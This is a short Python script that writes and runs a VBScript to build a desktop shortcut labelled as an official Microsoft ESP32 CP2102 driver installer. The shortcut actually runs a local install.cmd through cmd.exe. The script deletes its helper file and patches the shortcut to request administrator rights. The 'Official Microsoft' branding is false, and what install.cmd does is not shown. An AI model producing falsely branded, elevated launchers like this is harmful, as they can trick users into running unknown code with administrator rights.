import os

vbs_code = r'''
Set oWS = CreateObject("WScript.Shell")
sLinkFile = "C:\Users\kesha\Desktop\INSTALL_ESP32_DRIVER.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "cmd.exe"
oLink.Arguments = "/c ""C:\Users\kesha\Desktop\ESP32_OFFICIAL_DRIVER\install.cmd"""
oLink.WorkingDirectory = "C:\Users\kesha\Desktop\ESP32_OFFICIAL_DRIVER"
oLink.Description = "Install Official Microsoft ESP32 CP2102 Driver"
oLink.Save
'''

vbs_path = r"C:\Users\kesha\Desktop\make_lnk.vbs"
with open(vbs_path, "w") as f:
    f.write(vbs_code)

os.system(f'cscript //nologo "{vbs_path}"')
if os.path.exists(vbs_path):
    os.remove(vbs_path)

lnk_path = r"C:\Users\kesha\Desktop\INSTALL_ESP32_DRIVER.lnk"
if os.path.exists(lnk_path):
    with open(lnk_path, "r+b") as f:
        data = bytearray(f.read())
        data[0x15] |= 0x20  # SLDF_RUNAS_USER
        f.seek(0)
        f.write(data)
    print("SUCCESS: Updated shortcut to Official Microsoft Driver!")
